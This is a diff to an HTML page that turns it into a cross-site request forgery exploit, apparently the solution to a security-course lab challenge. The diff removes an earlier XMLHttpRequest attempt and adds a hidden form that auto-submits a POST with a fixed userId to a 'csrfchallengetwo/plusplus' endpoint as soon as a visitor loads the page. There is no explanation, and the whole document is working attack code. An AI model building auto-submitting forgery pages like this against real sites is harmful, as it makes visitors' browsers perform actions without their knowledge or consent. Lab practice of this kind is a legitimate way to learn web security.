@@ -1,18 +1,11 @@
 <!DOCTYPE html>
-<script type="text/javascript">
-  window.onload = function(){
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "/user/csrfchallengetwo/plusplus", true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-    xhr.send(JSON.stringify({
-      userId: "bc0b85a52bc83d2672aecf82fb695665fca2f921"
-    }));
-  };
-</script>
-
 <html>
 <body>
-<h1>Hello World</h1>
-<p>I'm hosted with GitHub Pages.</p>
+<form name="csrf2" action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST">
+<input type="hidden" name="userId" value="bc0b85a52bc83d2672aecf82fb695665fca2f921" />
+ <input type="submit"/>
+</form>
+  <script>document.csrf2.submit();</script>
 </body>
 </html>
+
